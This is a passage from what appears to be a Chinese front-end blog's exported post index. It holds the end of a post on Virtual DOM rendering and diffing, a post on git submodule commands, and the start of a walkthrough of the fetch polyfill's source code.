class="token punctuation">{</span><span class="token keyword">class</span><span class="token punctuation">:</span> <span class="token string">'item'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'Item 3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在 ol 只是一个 JavaScript 对象表示的 DOM 结构，但页面上并没有这个结构。我们可以根据这</p><p>个 ol 构建来生成真正的 ol。新增一个 render 方法，根据 tagName 构建一个真正的 DOM，然</p><p>后生成 DOM 属性、连接子结构等等。</p><pre class="line-numbers language-js"><code class="language-js">Ele<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>render <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> e <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tagName<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 创建元素</span>  <span class="token keyword">var</span> props <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> propName <span class="token keyword">in</span> props<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 设置 DOM 属性</span>    <span class="token keyword">var</span> propValue <span class="token operator">=</span> props<span class="token punctuation">[</span>propName<span class="token punctuation">]</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>propName<span class="token punctuation">,</span> propValue<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">var</span> children <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>children <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  children<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>child<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> childE <span class="token operator">=</span> <span class="token punctuation">(</span>child <span class="token keyword">instanceof</span> <span class="token class-name">Element</span><span class="token punctuation">)</span>      <span class="token operator">?</span> child<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 子节点也是虚拟 DOM，递归构建</span>      <span class="token punctuation">:</span> document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 字符串，构建文本节点</span>    e<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>childE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后只需要 render。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> olE <span class="token operator">=</span> Ele<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>olE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的 olE 是真正的 DOM 节点，把它 append 到 body 中，这样就有了真正的 ol DOM 元素。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>ol id<span class="token operator">=</span><span class="token string">'ol-list'</span><span class="token operator">></span>  <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'item'</span><span class="token operator">></span>Item <span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>  <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'item'</span><span class="token operator">></span>Item <span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>  <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'item'</span><span class="token operator">></span>Item <span class="token number">3</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ol<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Virtual-DOM-树的差异介绍（Diff算法）"><a href="#Virtual-DOM-树的差异介绍（Diff算法）" class="headerlink" title="Virtual DOM 树的差异介绍（Diff算法）"></a>Virtual DOM 树的差异介绍（Diff算法）</h2><h3 id="比较两棵虚拟DOM树的差异"><a href="#比较两棵虚拟DOM树的差异" class="headerlink" title="比较两棵虚拟DOM树的差异"></a>比较两棵虚拟DOM树的差异</h3><p>正如你所预料的，比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。两个树的完全的 diff 算法是一个时间复杂度为 O(n^3) 的问题。但是在前端当中，你很少会跨越层级地移动DOM元素。所以 Virtual DOM 只会对同一个层级的元素进行对比：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/diff1.png" alt="diff1.png"></p><p>上面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。</p><p>差异是指的是什么呢？DOM 替换掉原来的节点，如把上面的 div 换成了 section 进行移动、删</p><p>除、新增子节点，例如上面 div 的子节点，把 p 和 span 顺序互换修改了节点的属性。对于文本</p><p>节点，文本内容可能会改变。</p><p>如果我把左侧的 p、span、div 反过来变成 div、p、span 怎么办？按照差异正常会被替换掉，</p><p>但这样 DOM开销就会异常的大了。而 React 帮我们做到不需要替换节点，而只需要经过节点移</p><p>动就可以达到。</p><h3 id="深度优先遍历，记录差异"><a href="#深度优先遍历，记录差异" class="headerlink" title="深度优先遍历，记录差异"></a>深度优先遍历，记录差异</h3><p>在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/diff2.png" alt="diff2.png"></p><p>在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。</p><pre><code>// diff 函数，对比两棵树function diff (oldTree, newTree) {  var index = 0 // 当前节点的标志  var patches = {} // 用来记录每个节点差异的对象  dfsWalk(oldTree, newTree, index, patches)  return patches}// 对两棵树进行深度优先遍历function dfsWalk (oldNode, newNode, index, patches) {  // 对比oldNode和newNode的不同，记录下来  patches[index] = [...]  diffChildren(oldNode.children, newNode.children, index, patches)}// 遍历子节点function diffChildren (oldChildren, newChildren, index, patches) {  var leftNode = null  var currentNodeIndex = index  oldChildren.forEach(function (child, i) {    var newChild = newChildren[i]    currentNodeIndex = (leftNode &amp;&amp; leftNode.count) // 计算节点的标识      ? currentNodeIndex + leftNode.count + 1      : currentNodeIndex + 1    dfsWalk(child, newChild, currentNodeIndex, patches) // 深度遍历子节点    leftNode = child  })}</code></pre><p>例如，上面的div和新的div有差异，当前的标记是0，那么：</p><pre><code>patches[0] = [{difference}, {difference}, ...] // 用数组存储新旧节点的不同</code></pre><p>同理p是patches[1]，ul是patches[3]，类推。</p><h3 id="差异类型"><a href="#差异类型" class="headerlink" title="差异类型"></a>差异类型</h3><p>上面说的节点的差异指的是什么呢？对 DOM 操作可能会：</p><ul><li>替换掉原来的节点，例如把上面的div换成了section</li><li>移动、删除、新增子节点，例如上面div的子节点，把p和ul顺序互换</li><li>修改了节点的属性</li><li>对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2</li></ul><p>所以我们定义了几种差异类型：</p><pre><code>var REPLACE = 0var REORDER = 1var PROPS = 2var TEXT = 3</code></pre><p>对于节点替换，很简单。判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下：</p><pre><code>patches[0] = [{  type: REPALCE,  node: newNode // el(&#39;section&#39;, props, children)}]</code></pre><p>如果给div新增了属性id为container，就记录下：</p><pre><code>patches[0] = [{  type: REPALCE,  node: newNode // el(&#39;section&#39;, props, children)}, {  type: PROPS,  props: {    id: &quot;container&quot;  }}]</code></pre><p>那如果把我div的子节点重新排序呢？例如p, ul, div的顺序换成了div, p, ul。这个该怎么对比？如果按照同层级进行顺序对比的话，它们都会被替换掉。如p和div的tagName不同，p会被div所替代。最终，三个节点都会被替换，这样DOM开销就非常大。而实际上是不需要替换节点，而只需要经过节点移动就可以达到，我们只需知道怎么进行移动。</p><h3 id="列表对比算法"><a href="#列表对比算法" class="headerlink" title="列表对比算法"></a>列表对比算法</h3><p>假设现在可以英文字母唯一地标识每一个子节点：</p><p>旧的节点顺序：</p><blockquote><p>a b c d e f g h i</p></blockquote><p>现在对节点进行了删除、插入、移动的操作。新增j节点，删除e节点，移动h节点：</p><p>新的节点顺序：</p><blockquote><p>a b c h d f g i j</p></blockquote><p>现在知道了新旧的顺序，求最小的插入、删除操作（移动可以看成是删除和插入操作的结合）。这个问题抽象出来其实是字符串的最小编辑距离问题（<a href="https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Edit_distance" target="_blank" rel="noopener">Edition Distance</a>），最常见的解决算法是 <a href="https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Levenshtein_distance" target="_blank" rel="noopener">Levenshtein Distance</a>，通过动态规划求解，时间复杂度为 O(M * N)。但是我们并不需要真的达到最小的操作，我们只需要优化一些比较常见的移动情况，牺牲一定DOM操作，让算法时间复杂度达到线性的（O(max(M, N))。具体算法细节比较多，这里不累述，有兴趣可以参考<a href="https://link.zhihu.com/?target=https%3A//github.com/livoras/list-diff/blob/master/lib/diff.js" target="_blank" rel="noopener">代码</a>。</p><p>我们能够获取到某个父节点的子节点的操作，就可以记录下来：</p><pre><code>patches[0] = [{  type: REORDER,  moves: [{remove or insert}, {remove or insert}, ...]}]</code></pre><p>但是要注意的是，因为tagName是可重复的，不能用这个来进行对比。所以需要给子节点加上唯一标识key，列表对比的时候，使用key进行对比，这样才能复用老的 DOM 树上的节点。</p><p>这样，我们就可以通过深度优先遍历两棵树，每层的节点进行对比，记录下每个节点的差异了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>实际还需要处理事件监听、状态监控。生成虚拟 DOM 时也可以加入 JSX 语法。当然这些事情都做了的话，就可以构造一个简单的ReactJS了。</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> Virtual DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git submodule子模块</title>
      <link href="2019/01/02/submodule/"/>
      <url>2019/01/02/submodule/</url>
      
        <content type="html"><![CDATA[<p>有种情况我们经常会遇到：某个工作中的项目需要包含并使用另一个项目。 也许是第三方库，或者你独立开发的，用于多个父项目的库。 现在问题来了：你想要把它们当做两个独立的项目，同时又想在一个项目中使用另一个</p><h3 id="1、添加子模块"><a href="#1、添加子模块" class="headerlink" title="1、添加子模块"></a>1、添加子模块</h3><blockquote><p>git submodule add 【URL】【path】</p></blockquote><p>其中，url为子模块的路径，path为该子模块存储的目录路径</p><p>安装完成后会创建或者修改.gitmodules，新增一个文件路径</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git2.png" alt="git2.png"></p><p>.gitmodules内容如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git3.png" alt="git3.png"></p><h3 id="2、初始化更新子模块"><a href="#2、初始化更新子模块" class="headerlink" title="2、初始化更新子模块"></a>2、初始化更新子模块</h3><p>初始化本地配置文件</p><blockquote><p>git submodule init</p></blockquote><p>更新子模块</p><blockquote><p>git submodule foreach “git pull origin master”</p></blockquote><p>多个子模块都可以更新</p><h3 id="3、修改子模块"><a href="#3、修改子模块" class="headerlink" title="3、修改子模块"></a>3、修改子模块</h3><blockquote><p>cd rn-app(子模块目录)  </p><p>modified子模块   </p><p>git commit -am “modified commit” 提交修改内容  </p><p>git push origin master 提交代码到远程仓库</p></blockquote><h3 id="4、克隆子模块"><a href="#4、克隆子模块" class="headerlink" title="4、克隆子模块"></a>4、克隆子模块</h3><p>有两种方式克隆子模块：</p><p>(1)、采用递归参数 –recursive 克隆整个项目</p><blockquote><p>git clone –recursive git@**.com:cst-rn/rnSubscribe.git</p></blockquote><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git6.png" alt="git6.png"></p><p>可以看到只有父项目添加的子模块，在clone时，都会递归的把子模块全部克隆到项目里面</p><p>(2)、先clone父项目，在初始化submodule</p><blockquote><p>git clone  git@**.com:cst-rn/rnSubscribe.git  </p><p>cd rnSubscribe  </p><p>git submodule init  </p><p>git submodule update</p></blockquote><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git7.png" alt="git7.png"></p><h3 id="5、子模块删除"><a href="#5、子模块删除" class="headerlink" title="5、子模块删除"></a>5、子模块删除</h3><blockquote><p>git rm –cached 子模块目录 删除子模块缓存</p><p>rm -rf 子模块目录  删除子模块目录</p><p>vim .gitmodules 删除对于子模块相关条目  </p><p>vim .git/config 删除配置项中子模块相关条目</p></blockquote><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><p>1、一些操作导致子模块无法正常添加</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git4.png" alt="git4.png"></p><p>使用一下命令安装：</p><blockquote><p>git submodule add –name Common <a href="mailto:git@gitlab.abc.com" target="_blank" rel="noopener">git@gitlab.abc.com</a>:cs70/console-before.git ./rn-app  </p><p>或者  </p><p>git submodule add –force git@**.com:cst-rn/rn-app.git</p></blockquote><p>2、提示子模块已存在 但是本地并未见到</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git5.png" alt="git5.png"></p><p>删除子模块是未删除干净</p><p>git rm –cached rn-design<br>rm -rf rn-design<br>rm .gitmodules</p><p>vim .git/config 删除配置项中子模块相关条目</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fetch源码解析</title>
      <link href="2019/01/02/fetch/"/>
      <url>2019/01/02/fetch/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> support <span class="token operator">=</span> <span class="token punctuation">{</span>  searchParams<span class="token punctuation">:</span> <span class="token string">'URLSearchParams'</span> <span class="token keyword">in</span> self<span class="token punctuation">,</span>  iterable<span class="token punctuation">:</span> <span class="token string">'Symbol'</span> <span class="token keyword">in</span> self <span class="token operator">&amp;&amp;</span> <span class="token string">'iterator'</span> <span class="token keyword">in</span> Symbol<span class="token punctuation">,</span>  blob<span class="token punctuation">:</span>    <span class="token string">'FileReader'</span> <span class="token keyword">in</span> self <span class="token operator">&amp;&amp;</span>    <span class="token string">'Blob'</span> <span class="token keyword">in</span> self <span class="token operator">&amp;&amp;</span>    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  formData<span class="token punctuation">:</span> <span class="token string">'FormData'</span> <span class="token keyword">in</span> self<span class="token punctuation">,</span>  arrayBuffer<span class="token punctuation">:</span> <span class="token string">'ArrayBuffer'</span> <span class="token keyword">in</span> self<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">isDataView</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> obj <span class="token operator">&amp;&amp;</span> DataView<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">isPrototypeOf</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>arrayBuffer<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> viewClasses <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'[object Int8Array]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Uint8Array]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Uint8ClampedArray]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Int16Array]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Uint16Array]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Int32Array]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Uint32Array]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Float32Array]'</span><span class="token punctuation">,</span>    <span class="token string">'[object Float64Array]'</span>  <span class="token punctuation">]</span>  <span class="token keyword">var</span> isArrayBufferView <span class="token operator">=</span>    ArrayBuffer<span class="token punctuation">.</span>isView <span class="token operator">||</span>    <span class="token keyword">function</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> obj <span class="token operator">&amp;&amp;</span> viewClasses<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">normalizeName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> name <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    name <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/[^a-z0-9\-#$%&amp;'*+.^_`|~]/i</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Invalid character in header field name'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">normalizeValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> value <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    value <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> value<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Build a destructive iterator for the value list</span><span class="token keyword">function</span> <span class="token function">iteratorFor</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> iterator <span class="token operator">=</span> <span class="token punctuation">{</span>    next<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> value <span class="token operator">=</span> items<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token punctuation">{</span>done<span class="token punctuation">:</span> value <span class="token operator">===</span> undefined<span class="token punctuation">,</span> value<span class="token punctuation">:</span> value<span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>iterable<span class="token punctuation">)</span> <span class="token punctuation">{</span>    iterator<span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> iterator    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> iterator<span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">Headers</span><span class="token punctuation">(</span>headers<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>map <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>headers <span class="token keyword">instanceof</span> <span class="token class-name">Headers</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    headers<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>headers<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    headers<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>header<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> header<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>headers<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> headers<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>append <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  name <span class="token operator">=</span> <span class="token function">normalizeName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  value <span class="token operator">=</span> <span class="token function">normalizeValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>  <span class="token keyword">var</span> oldValue <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">[</span>name<span class="token punctuation">]</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> oldValue <span class="token operator">?</span> oldValue <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> value <span class="token punctuation">:</span> value<span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">[</span><span class="token function">normalizeName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token keyword">get</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  name <span class="token operator">=</span> <span class="token function">normalizeName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>has <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token function">normalizeName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token keyword">set</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">[</span><span class="token function">normalizeName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">normalizeValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>forEach <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>callback<span class="token punctuation">,</span> thisArg<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> name <span class="token keyword">in</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      callback<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>thisArg<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>keys <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>    items<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">iteratorFor</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token 